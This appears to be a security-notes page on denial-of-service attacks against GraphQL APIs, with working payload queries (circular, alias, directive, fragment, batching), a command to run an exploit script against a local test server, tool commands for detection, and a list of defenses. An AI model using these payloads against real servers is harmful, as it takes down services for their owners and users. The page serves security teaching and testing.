# GraphQL DOS

&#x20;This Section focuses on how GraphQL's query language can be exploited to cause denial-of-service (DoS) attacks, which can degrade performance or completely take down a server.&#x20;

### **DoS Vectors:**

* **Circular Queries (Recursive Queries):** These occur when relationships in the GraphQL schema create bidirectional links between objects, leading to recursive requests that can crash a server.

**Vulnerable code**

```graphql
# A circular reference in a schema
type Paste {
    title: String
    content: String
    user_agent: String
    ip_address: String
    owner: Owner
}
type Owner {}
    ip_address: String
    user_agent: String
    pastes: [Paste]
    name: String
}
```

**Exploit**

{% code overflow="wrap" %}
```graphql
# This query is simple to execute yet causes an exponentially large response from the GraphQL server. The more loops in the query, the larger the response becomes.
query {
    pastes {
        owner {
            pastes {
                owner {
                    pastes {
                        owner {
                            name
                        }
                    }
                }
            }
        }
    }
}
```
{% endcode %}

***

#### **Circular Introspection Vulnerabilities:**&#x20;

The introspection system has its own schema, defined in the official GraphQL specification document.&#x20;

GraphQL's built-in introspection system may contains a circular relationship that can be exploited when introspection is enabled. This circularity arises from the system's schema:

**Schema Structure**:

* The `__Schema` type has a `types` field referencing `[__Type!]` (non-nullable array of `__Type` objects).
* The `__Type` type includes a `fields` field returning `[__Field!]` (non-nullable array of `__Field` objects).
* The `__Field` type has a `type` field referencing `__Type`, creating a circular dependency between `__Type.fields` and `__Field.type`.

**Testing the Circular Query**: The circular relationship can be tested with a query like this:

```graphql
query {
  __schema {
    types {
      fields {
        type {
          fields {
            type {
              fields {
                name
              }
            }
          }
        }
      }
    }
  }  
}
```

**Exploitation Risk**: While a single query may not disrupt a server, a series of complex circular queries could degrade performance or potentially crash the system.

For further details, refer to the full introspection schema in the [GraphQL Specification](https://spec.graphql.org/October2021/#sec-Schema-Introspection).

***

#### **Field Duplication:**&#x20;

By repeating the same field multiple times in a query, an attacker can force the server to process the same information repeatedly. Although GraphQL will consolidate the response, the server will still process the request multiple times, resulting in resource exhaustion.

GraphQL may seem to ignore repeating fields due to response consolidation. When you query with repeated fields, like in Listing 5-5 with content repeated five times, GraphQL shows only a single content field in the response. However, server-side vulnerabilities can still arise unless defenses like query cost analysis are used.

```graphql
{
  user {
    id
    email
    email
    email
  }
}
```

***

#### **Alias Overloading**&#x20;

GraphQL aliases can be exploited to send multiple requests with different names in a single query, which can overwhelm the server.

```graphql
query {
    one:systemUpdate
    two:systemUpdate
    three:systemUpdate
    four:systemUpdate
    five:systemUpdate
}
```

* **Chaining Aliases and Circular Queries:**&#x20;

```graphql
# Circular queries with aliases
query {
        q1:pastes {
            owner {
                pastes {
                    owner {
                        name
                    }
            }
        }
    }
    q2:pastes {
       owner {
           pastes {
               owner {
                   name
                   }
               }
           }
       }
}
```

* **Directive Overloading**: Similar to field duplication, this involves sending many directives with a query, exhausting the server’s query parsers.

```graphql
query {
    pastes {
        title @aa@aa@aa@aa # add as many directives as possible
        content @aa@aa@aa@aa
    }
}
```

{% embed url="https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/exploit_directive_overloading.py" %}

* **Exploit Script**: The script multiplies a directive (e.g., `@dos`) to create a malicious payload, sends it in a query, and runs 300 threads in an infinite loop to overload the server.
*   **Usage**: Run with the command:

    ```
    python3 exploit_directive_overloading.py http://localhost:5013/graphql 30000
    ```
* **Impact**: The server may become slow or unresponsive during the attack.
* **Note**: The directive (`@dos`) can be any arbitrary text.

***

#### **Circular Fragments**

&#x20;Fragments that reference one another can cause infinite loops, leading to DoS conditions.

```graphql
query CircularFragment {
    pastes {
        ...Start
    }
}

fragment Start on PasteObject {
    title
    content
    ...End
}

fragment End on PasteObject {
    ...Start
}
```

***

#### **Object Limit Overriding**&#x20;

Overriding limits on fields that return arrays, by using API pagination arguments like `filter`, `max`, `limit`, and `total`, can result in DoS.

GraphQL servers often limit the amount of data returned to clients, especially for fields returning arrays, to prevent excessive load. However, these limits can sometimes be overridden, posing potential risks.

* **Default Limits**: Without explicit limits, queries (e.g., `pastes`) may return all records. For example, a database with 10,000 objects could overwhelm server and client resources.
* **Server Logic**: Servers can enforce limits, such as returning only the most recent 100 items, through sorting or filtering at the GraphQL or database level.
*   **Override Example**: Clients may bypass limits using arguments like `limit`:

    ```graphql
    query {
      pastes(limit: 100000, public: true) {
        content
      }
    }
    ```
* This might execute as:

```sql
SELECT content FROM pastes WHERE public = true LIMIT 100000
```

* **Pagination**: Keywords like `limit`, `offset`, `first`, and `last` are common for managing large datasets. Pagination splits data into smaller chunks for efficient querying.
* **Risks**:
  * Large datasets could enable database-level DoS if the server processes excessive rows.
  * Introspection or trial queries can reveal supported arguments, enabling abuse.

**Mitigation**: Enforce strict server-side limits and implement robust pagination to protect against excessive data requests.

***

* **Array-Based Query Batching:**&#x20;

This technique involves sending multiple queries within a single HTTP request using arrays. This can bypass traditional rate-limiting controls and exacerbate the impact of other DoS vectors.

```
[
    query {
        ipAddr
        title
        content
    }
    query {
        ipAddr
        title
        content
    }
]
```

* **Detecting Query Batching by Using BatchQL:**

```bash
cd BatchQL
python3 batch.py -e http://localhost:5013/graphql
```

BatchQL was able to detect that both array-based batching and alias- based batching are available.

### **Testing for DoS Vulnerabilities:**

* **Manual review of SDL files**: Developers should look for circular relationships in the schema, or they can use GraphQL Voyager to visualize the schema.
* Using Schema Definition Language Files: Example: [https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/sdl.graphql](https://github.com/dolevf/Black-Hat-GraphQL/blob/master/ch05/sdl.graphql)&#x20;

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Using GraphQL Voyager:&#x20;

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Object relationships in GraphQL Voyager</p></figcaption></figure>

* **InQL:**

```bash
# Testing for circular queries with inql
inql -f /home/kali/introspection_query.json --generate-cycles -o dvga_cycles
[!] Parsing local schema file
[+] Writing Introspection Schema JSON
[+] Writing query Templates
Writing systemUpdate query
Writing pastes query
[+] Writing mutation Templates
Writing createPaste mutation
[+] Writing Query Cycles to introspection_query
[+] DONE

# test one link
inql -t http://localhost:5013/graphql --generate-cycles -o dvga_cycles

# working with list of hosts
for host in $(cat hosts.txt); do
    inql -t "$host" --generate-cycles
done
```

* **GraphQL Cop:** This tool can detect DoS vectors by auditing the GraphQL API and schema.

```bash
python3 graphql-cop.py -t http://localhost:5013/graphql
```

### **Denial-of-Service Defenses in GraphQL:**

* **Query Cost Analysis:** Assigning costs to fields to limit the overall cost of a query.
* **Query Depth Limits:** Limiting the number of nested fields in a query.
* **Alias and Array-Based Batching Limits:** Restricting the number of aliases or batched queries allowed in a single request.
* **Field Duplication Limits**: Limiting the number of duplicated fields in a query.
* **Limits on the Number of Returned Records**: Limiting the number of records returned by a query.
* **Query Allow Lists:** Only allowing pre-approved queries to be executed.
* **Automatic Persisted Queries (APQ):** Using a server-side cache of approved queries to avoid the need to parse every request.
* **Timeouts**: Setting time limits for query executions.
* **Web Application Firewalls (WAFs):** Using a WAF to detect and block malicious requests.
* **Gateway Proxies:** Merging multiple GraphQL schemas into one, and enforcing policies at the gateway.

<figure><img src="../../.gitbook/assets/image (299).png" alt=""><figcaption><p>The dangers of stateless cost analysis</p></figcaption></figure>
